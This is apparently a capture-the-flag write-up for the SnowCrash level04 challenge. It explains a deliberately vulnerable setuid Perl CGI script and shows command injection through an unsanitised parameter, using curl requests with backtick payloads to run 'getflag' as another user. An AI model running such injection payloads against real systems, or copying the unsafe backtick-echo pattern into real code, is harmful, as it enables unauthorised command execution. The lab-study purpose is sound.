## level04

```bash
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

The permission `s` is the "setuid" bit, which tells the OS to execute that program with the userid of its owner. This is typically used with files owned by root to allow normal users to execute them as root with no external tools (such as `sudo`). So [level04.pl](http://level04.pl) would be executed as `flag04`.

The file is a Perl script:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\\n\\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

```

1. **Importing CGI Module**:
    
    ```perl
    use CGI qw{param};
    ```
    
    This line imports the `CGI` module and specifically the `param` function from it. The `CGI` module is used for handling Common Gateway Interface (CGI) requests and responses, which are typically used in web applications.
    
2. **HTTP Header**:
    
    ```perl
    print "Content-type: text/html\\n\\n";
    ```
    
    This line prints the HTTP header indicating that the content type of the response is HTML.
    
3. **Subroutine Definition**:
    
    ```perl
    sub x {
      $y = $_[0];
      print `echo $y 2>&1`;
    }
    ```
    
    This defines a subroutine `x` that takes one argument (`$_[0]`), assigns it to the variable `$y`, and then executes the shell command `echo $y 2>&1`. The backticks ``` are used to execute the command in the shell and capture its output, which is then printed.
    
4. **Calling the Subroutine**:
    
    ```perl
    x(param("x"));
    ```
    
    This calls the subroutine `x` with the value of the CGI parameter `x`. The `param` function retrieves the value of the parameter `x` from the CGI request.
    
    A quick `curl` to [`localhost:4747`](http://localhost:4747) shows me that I can execute code since the parameter is not sanitized!
    
    ```bash
    level04@SnowCrash:~$ curl http://localhost:4747/?x=hello
    hello
    level04@SnowCrash:~$ curl http://localhost:4747/?x=hello;whoami
    hello
    level04
    level04@SnowCrash:~$ curl http://localhost:4747/?x=hello;ls
    hello
    level04.pl
    ```
    
    The problem is that I’m still `level04`... It’s a security feature introduced in Perl (see [here](https://mattmccutchen.net/suidperl.html)).
    
    I need a way to execute the script and pass it the parameter I want.
    
    A few considerations:
    
    - The only instructions called by the script itself is `echo`: if I chain more I can still execute them (as in the second and third examples above) but not as `flag04`
    - I need the argument of echo to be executed and not printed as it is: for that I need the backtick (```) syntax
    
    ```bash
    level04@SnowCrash:~$ curl localhost:4747/?x=whoami
    whoami
    level04@SnowCrash:~$ curl localhost:4747/?x=`whoami`
    level04
    ```
    
    - now `whoami` is called but *before* being passed! I need to pass **literally** ``whoami``so `'`whoami`'`. This way the instruction is not called by the current user `level04` but it’s instead passed as it is.
    
    ```bash
    level04@SnowCrash:~$ curl localhost:4747/?x='`whoami`'
    flag04
    level04@SnowCrash:~$ curl localhost:4747/?x='`getflag`'
    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
    ```

	### Key Learnings
	- Privilege escalation by exploiting a script running as a different user
	- Mastering the backtick and single quotes to pass a command to a script